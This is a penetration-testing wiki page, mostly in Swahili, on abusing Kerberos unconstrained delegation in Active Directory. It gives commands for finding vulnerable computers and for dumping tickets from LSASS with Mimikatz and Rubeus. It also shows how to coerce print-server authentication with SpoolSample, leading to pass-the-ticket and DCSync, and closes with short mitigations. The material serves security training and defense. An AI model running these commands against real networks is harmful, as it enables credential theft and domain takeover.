# Unconstrained Delegation

{{#include ../../banners/hacktricks-training.md}}

## Unconstrained delegation

Hii ni kipengele ambacho Msimamizi wa Domain anaweza kuweka kwa **Kompyuta** yoyote ndani ya domain. Kisha, kila wakati **mtumiaji anapoingia** kwenye Kompyuta, **nakala ya TGT** ya mtumiaji huyo itakuwa **inatumwa ndani ya TGS** inayotolewa na DC **na kuhifadhiwa kwenye kumbukumbu katika LSASS**. Hivyo, ikiwa una mamlaka ya Msimamizi kwenye mashine hiyo, utaweza **kudondosha tiketi na kujifanya kuwa watumiaji** kwenye mashine yoyote.

Hivyo ikiwa msimamizi wa domain anaingia ndani ya Kompyuta yenye kipengele cha "Unconstrained Delegation" kimewashwa, na una mamlaka ya msimamizi wa ndani kwenye mashine hiyo, utaweza kudondosha tiketi na kujifanya kuwa Msimamizi wa Domain popote (domain privesc).

Unaweza **kupata vitu vya Kompyuta vyenye sifa hii** kwa kuangalia ikiwa sifa ya [userAccountControl](<https://msdn.microsoft.com/en-us/library/ms680832(v=vs.85).aspx>) ina [ADS_UF_TRUSTED_FOR_DELEGATION](<https://msdn.microsoft.com/en-us/library/aa772300(v=vs.85).aspx>). Unaweza kufanya hivi kwa kutumia kichujio cha LDAP cha ‘(userAccountControl:1.2.840.113556.1.4.803:=524288)’, ambacho ndicho powerview hufanya:
```bash
# List unconstrained computers
## Powerview
## A DCs always appear and might be useful to attack a DC from another compromised DC from a different domain (coercing the other DC to authenticate to it)
Get-DomainComputer –Unconstrained –Properties name
Get-DomainUser -LdapFilter '(userAccountControl:1.2.840.113556.1.4.803:=524288)'

## ADSearch
ADSearch.exe --search "(&(objectCategory=computer)(userAccountControl:1.2.840.113556.1.4.803:=524288))" --attributes samaccountname,dnshostname,operatingsystem

# Export tickets with Mimikatz
## Access LSASS memory
privilege::debug
sekurlsa::tickets /export #Recommended way
kerberos::list /export #Another way

# Monitor logins and export new tickets
## Doens't access LSASS memory directly, but uses Windows APIs
Rubeus.exe dump
Rubeus.exe monitor /interval:10 [/filteruser:<username>] #Check every 10s for new TGTs
```
Load the ticket of Administrator (or victim user) in memory with **Mimikatz** or **Rubeus for a** [**Pass the Ticket**](pass-the-ticket.md)**.**\
More info: [https://www.harmj0y.net/blog/activedirectory/s4u2pwnage/](https://www.harmj0y.net/blog/activedirectory/s4u2pwnage/)\
[**More information about Unconstrained delegation in ired.team.**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/domain-compromise-via-unrestricted-kerberos-delegation)

### **Force Authentication**

Ikiwa mshambuliaji anaweza **kudukua kompyuta iliyo ruhusiwa kwa "Unconstrained Delegation"**, anaweza **kujifanya** kwa **Print server** ili **kuingia moja kwa moja** dhidi yake **akihifadhi TGT** katika kumbukumbu ya server.\
Kisha, mshambuliaji anaweza kufanya **Pass the Ticket attack to impersonate** akaunti ya kompyuta ya mtumiaji Print server.

Ili kufanya print server iingie dhidi ya mashine yoyote unaweza kutumia [**SpoolSample**](https://github.com/leechristensen/SpoolSample):
```bash
.\SpoolSample.exe <printmachine> <unconstrinedmachine>
```
Ikiwa TGT inatoka kwa kiongozi wa eneo, unaweza kufanya [**DCSync attack**](acl-persistence-abuse/index.html#dcsync) na kupata hash zote kutoka kwa DC.\
[**Maelezo zaidi kuhusu shambulio hili katika ired.team.**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/domain-compromise-via-dc-print-server-and-kerberos-delegation)

Pata hapa njia nyingine za **kulazimisha uthibitishaji:**

{{#ref}}
printers-spooler-service-abuse.md
{{#endref}}

### Mitigation

- Punguza logins za DA/Admin kwa huduma maalum
- Weka "Account is sensitive and cannot be delegated" kwa akaunti zenye mamlaka.

{{#include ../../banners/hacktricks-training.md}}
